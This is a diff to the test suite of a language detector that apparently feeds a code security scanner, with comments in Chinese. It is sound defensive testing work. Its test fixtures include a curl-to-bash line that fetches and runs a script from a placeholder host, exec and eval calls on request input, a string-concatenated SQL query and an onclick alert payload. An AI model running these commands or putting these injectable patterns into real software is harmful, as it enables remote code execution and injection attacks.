@@ -26,7 +26,7 @@ MODULES = os.path.join(BASE, 'modules')
 if MODULES not in sys.path:
     sys.path.insert(0, MODULES)
 
-from lang_detect import detect, score  # noqa: E402
+from lang_detect import detect, score, SIGNATURES  # noqa: E402
 
 CASES = {
     'python': (
@@ -166,6 +166,126 @@ def test_scores_are_deterministic():
     code = CASES['go']
     assert score(code) == score(code)
     print('    打分确定')
+
+
+# ── 2026-11-24 补：往扫描器里真会粘的东西 ─────────────────────────
+# 背景：7 天内 15 个人打开试扫页，2 个人各失败 8 次全是 need_language。
+# 拿 33 个真实形态的样本量了一遍，21 个认不出，其中 11 个是「所有语言 0 分」——
+# 一行 os.system、一行拼 SQL、一段 shell、eval($_GET) 全都不认识。
+# 这些恰恰是往安全扫描器里最常粘的东西，等于默认路径上产品是坏的。
+ONE_LINERS = {
+    'python': [
+        'exec(request.args.get("cmd"))',
+        'os.system(cmd)',
+        'subprocess.run(cmd, shell=True)',
+    ],
+    'shell': [
+        'curl http://x.sh/i.sh | bash',
+        'for f in *.log; do gzip "$f"; done',
+        'export PATH=$PATH:/opt/bin\nif [ -f /tmp/x ]; then rm -f /tmp/x; fi',
+    ],
+    'sql': [
+        "SELECT * FROM users WHERE id = ' + id + '",
+        'SELECT id, name FROM users WHERE age > 18 ORDER BY id DESC LIMIT 10',
+        'DELETE FROM logs WHERE ts < 0',
+    ],
+    'php': ['eval($_GET["x"]);'],
+    'lua': ['local x = 1\nprint(x)'],
+    'javascript': ["app.get('/x', (req, res) => res.send(req.query.id))"],
+}
+
+# 这些不是源代码，或者光看这一行分不出语言。要求它们**认不出**（返回 None），
+# 由前端给候选让人点——硬猜一个语言去扫，漏报是静默的。
+NOT_CODE_OR_AMBIGUOUS = [
+    '{"name": "test", "port": 8080, "debug": true}',
+    'name: test\nversion: "1.0"\nservices:\n  web:\n    port: 8080',
+    'FROM node:18\nRUN npm install\nCMD ["node", "app.js"]',
+    '<div onclick="alert(1)">x</div>',
+    '这段代码有 SQL 注入风险，建议改成参数化查询。',
+    'Traceback (most recent call last):\n  File "app.py", line 10, in <module>\n    main()\nNameError: name x is not defined',
+]
+
+
+def test_one_liners_are_recognized():
+    wrong = []
+    for want, snippets in ONE_LINERS.items():
+        for code in snippets:
+            got, top, second = detect(code)
+            if got != want:
+                wrong.append('%r 应为 %s，实得 %s (top=%d second=%d)'
+                             % (code[:40], want, got, top, second))
+    assert not wrong, '粘一行就认不出，用户只能看到「请在语言里选一个」：\n' + '\n'.join(wrong)
+    total = sum(len(v) for v in ONE_LINERS.values())
+    print('    %d 个一行式/短片段全部认对' % total)
+
+
+def test_non_code_is_not_guessed():
+    bad = []
+    for code in NOT_CODE_OR_AMBIGUOUS:
+        got, top, second = detect(code)
+        if got is not None:
+            bad.append('%r 被判成 %s (top=%d second=%d)' % (code[:36], got, top, second))
+    assert not bad, '不该猜的硬猜了（认错语言 = 静默漏报）：\n' + '\n'.join(bad)
+    print('    %d 段非源码/歧义内容都不猜' % len(NOT_CODE_OR_AMBIGUOUS))
+
+
+def test_candidates_come_from_scores():
+    """认不准时给的候选，必须跟打分一致、最多 3 个、0 分的不许出现。"""
+    from lang_detect import candidates
+    swift_ish = 'let x = try! JSONDecoder().decode(Foo.self, from: data)'
+    got = candidates(swift_ish)
+    assert got, '这段有一个 2 分的 JS 线索，候选不该是空的'
+    assert got[0][0] == 'javascript', '候选首位应与打分首位一致，实得 %r' % (got,)
+    assert len(got) <= 3
+    assert [s for _l, s in got] == sorted([s for _l, s in got], reverse=True), '候选未按分数降序'
+    assert candidates('这段代码有 SQL 注入风险，建议改成参数化查询。') == [], \
+        '纯中文说明没有任何语言特征，却给了候选'
+    print('    候选与打分同源，且不越界')
+
+
+def _try_langs_from_source():
+    """从 free_try.py 里读 TRY_LANGS（不 import：那会拉起 flask 和日志句柄）。"""
+    import ast
+    path = os.path.join(BASE, 'modules', 'free_try.py')
+    tree = ast.parse(open(path, encoding='utf-8').read())
+    for node in tree.body:
+        if isinstance(node, ast.Assign) and getattr(node.targets[0], 'id', '') == 'TRY_LANGS':
+            return [row[0] for row in ast.literal_eval(node.value)]
+    raise AssertionError('free_try.py 里找不到 TRY_LANGS —— 改名了就同步改这条守卫')
+
+
+def _langs_without_signatures(selectable, sig_keys):
+    return [l for l in selectable if l not in sig_keys]
+
+
+def test_every_selectable_language_can_be_auto_detected():
+    """下拉框里能选的每门语言，SIGNATURES 里必须有特征。
+
+    此前 17 个选项里 shell / sql / lua 一条特征都没有 —— 「自动识别」永远认不出，
+    它们只是摆在下拉框里好看；反过来 dart 有特征却不在名单里，认出来也只能回
+    「暂不支持这门语言」，用户无路可走。两份名单必须对齐，这里钉住。
+    """
+    selectable = _try_langs_from_source()
+    missing = _langs_without_signatures(selectable, set(SIGNATURES))
+    assert not missing, (
+        '这些语言在下拉框里能选，自动识别却永远认不出：%s\n'
+        '要么给它们补特征，要么从 TRY_LANGS 里去掉' % missing)
+    undetected_extra = set(SIGNATURES) - set(selectable)
+    assert not undetected_extra, (
+        '这些语言认得出、但试扫不收：%s\n'
+        '会被回「暂不支持这门语言」，等于死路' % sorted(undetected_extra))
+    print('    %d 门可选语言与特征表一一对齐' % len(selectable))
+
+
+def test_list_mismatch_guard_catches_missing_feature():
+    """造坏自检：名单里塞一门没有特征的语言，上面的判据必须判红。"""
+    fake = ['python', 'java', 'shell', 'klingon']
+    assert _langs_without_signatures(fake, set(SIGNATURES)) == ['klingon'], \
+        '判据认不出「名单里有、特征表里没有」——换成旧代码它照样报绿'
+    # 反向：名单里只有 python 时，特征表多出来的 14 门必须被算出来，
+    # 否则 dart 这种「认得出但试扫不收」的死路会重新长出来。
+    missing_reverse = set(SIGNATURES) - set(['python'])
+    assert missing_reverse, '反向检查失效：名单之外的语言一门都没算出来'
 
 
 if __name__ == '__main__':
